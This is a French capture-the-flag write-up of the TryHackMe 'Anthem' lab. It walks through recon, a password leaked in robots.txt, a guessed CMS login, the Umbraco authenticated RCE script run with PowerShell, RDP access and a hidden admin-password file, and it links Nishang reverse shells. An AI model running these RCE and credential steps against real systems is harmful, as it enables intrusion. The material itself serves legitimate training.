---
title: Anthem - TryHackMe
date: 2024-04-27 00:52:30 -0500
description: Anthem sur TryHackMe est une machine Windows facile pour les débutants. L'exploitation implique la découverte de mots de passe dans des fichiers web, l'accès à un CMS Umbraco, l'utilisation d'un exploit RCE pour obtenir un shell, et la recherche et l'utilisation d'un mot de passe administrateur pour l'escalade de privilèges.
categories: [TryHackMe]
tags: [THM, CTFs, Hacking]
image:
    path: https://i.ibb.co/fqf0HnY/Copie-de-Manager-1.png
---


- **[The Best Academy to Learn Hacking](https://affiliate.hackthebox.com/nenandjabhata)**.
- **[Beginner Friendly challenges on TryHackMe](https://tryhackme.com/signup?referrer=61e8a27ddd3f3b00496505d1)**.


## Reconnaissance
Avec un petit scan de nmap, je trouve ces 2 ports qui sont ouvert
```terminal
└─# /home/blo/tools/nmapautomate/nmapauto.sh $ip
Scanning 10.10.26.182 [65535 ports]
Discovered open port 3389/tcp on 10.10.26.182
Discovered open port 80/tcp on 10.10.26.182
```
- RDP ouvert sur le 3389
- Un site Web Disponible sur le port 80

Dans le site web je trouve le fichier `/robots.txt` qui contient un mot de passe `UmbracoIsTheBest!`, Donc alors maintenant il faut trouver un utilisateur pour ce mot de passe
- Dans le Blog je trouve un poeme avec les mots suivantes:
```
Born on a Monday,
Christened on Tuesday,
Married on Wednesday,
Took ill on Thursday,
Grew worse on Friday,
Died on Saturday,
Buried on Sunday.
That was the end…       
```
Je copie ce texte et je fais une recherche sur Google, puis je trouve que l'utilisateur qui a fait le poem s'appelle `Solomon Grundy` en faisant reference au mail qui se trouve dans le [We are Hiring](http://10.10.74.33/archive/we-are-hiring/) qui est : `JD@anthem.com`, c'est a dire que c'est l'email de `Jane Doe`, alors le meme cas ici c'est de prendre les premieres lettre de l'utilisateur `Solomon Grundy` et ce sera `SG@anthem.com` et d'acceder avec le mot de passe `UmbracoIsTheBest!` que j'avais deja trouver

### L'acces Initial
Ok, maintenant j'ai un acces administrateur sur le CMS.
>Chaque fois que je trouve un CMS, je commence toujours par checker sur Google pour des exploits
>{: .prompt-info}

Alors en faisant quelque recherches je trouve un Exploit sur Github [Umbraco-RCE) Remote Code Execution ](https://github.com/noraj/Umbraco-RCE)
[![exploit](https://i.ibb.co/9T90bDT/exploit.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}
L'exploit fonctionne, alors je vais lister les fichiers disponibles avec `powershell` et la commande `ls`
```sh
└─# python3 umbraco.py -u SG@anthem.com -p 'UmbracoIsTheBest!' -i http://10.10.74.33/ -c powershell.exe -a 'ls'


    Directory: C:\windows\system32\inetsrv


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       05/04/2020     21:51                Config                                                                
d-----       05/04/2020     21:51                de-DE                                                                 
d-----       05/04/2020     11:27                en                                                                    
d-----       05/04/2020     11:27                en-US                                                                 
d-----       05/04/2020     21:51                es-ES                                                                 
d-----       05/04/2020     21:51                fr-FR                                                                 
d-----       05/04/2020     21:51                it-IT                                                                 
d-----       05/04/2020     21:51                ja-JP                                                                 
d-----       05/04/2020     21:51                ko-KR                                                                 
d-----       05/04/2020     21:51                ru-RU                                                                 
d-----       05/04/2020     21:51                zh-CN                                                                 
d-----       05/04/2020     21:51                zh-TW                                                                 
-a----       05/04/2020     11:27         119808 appcmd.exe                                                            
-a----       15/09/2018     08:14           3810 appcmd.xml                                                            
-a----       05/04/2020     11:27         181760 AppHostNavigators.dll                                                 
-a----       05/04/2020     11:26          80896 apphostsvc.dll                                                        
-a----       05/04/2020     11:27         406016 appobj.dll                                                            
-a----       05/04/2020     11:26         131072 aspnetca.exe                                                          
-a----       05/04/2020     11:27          40448 authanon.dll                                                          
-a----       05/04/2020     11:26          24064 cachfile.dll                                                          
```

D'ici on peux creer un shell en `.ps1`, puis la mettre sur la machine et d'avoir un Shell. Mais aussi comme le RDP est deja ouvert, alors je vais voir quels sont les utilisateurs disponible

```sh
└─# xfreerdp /v:10.10.77.208 /u:SG /p:UmbracoIsTheBest! /sec:tls
[01:11:11:148] [31485:31486] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[01:11:11:148] [31485:31486] [WARN][com.freerdp.crypto] - CN = WIN-LU09299160F
[01:11:19:471] [31485:31486] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[01:11:19:472] [31485:31486] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
```

[![user.txt](https://i.ibb.co/FwwBvdk/a1.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}
Je trouve le flag user dans le Bureau `THM{NOOT_NOOT}`

## Privilege Escalation
Maintenant finit avec le user, il faut donc elever nos privilege et etre root sur la Machine.
Dans la room, on me donne un hint sur le mot de passe de l'admin en disant `it's hidden`. Alors je vais afficher tous les fichiers cachee sur la machine

[![Hidden Files](https://i.ibb.co/sRCWFsd/a2.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

En revenant a mon `C:\` je trouve un nouveau Dossier qui s'appel `backup` et un fichier `restore`.
[![backup](https://i.ibb.co/GpPw2V4/a3.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

J'avais pas les permissions necessaires pour ouvrir ce fichier, donc j'ai pu le modifier dans les proprietes et ensuite j'affiche le contenue :

[![Admin Pass](https://i.ibb.co/2FwSswt/a4.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}

J'utilise comme le mot de passe administrator pour me connecter au `cmd` et ca marche :

[![Rooted](https://i.ibb.co/g4D8Wqr/a5.png)](https://www.highcpmgate.com/pa1gkrtv?key=abe32dd965f8390efccf9628bbed6b26){:target="_blank"}



## Ressources supplementaires
Voici quelques ressources supplémentaires qui pourraient vous être utiles :
[Umbraco CMS 7.12.4 - (Authenticated) Remote Code Execution ](https://www.exploit-db.com/exploits/46153)
[Nishang PowerShells](https://github.com/samratashok/nishang/tree/master/Shells)
- [Join Us on Discord](https://discord.gg/wBT9wr9ruG).
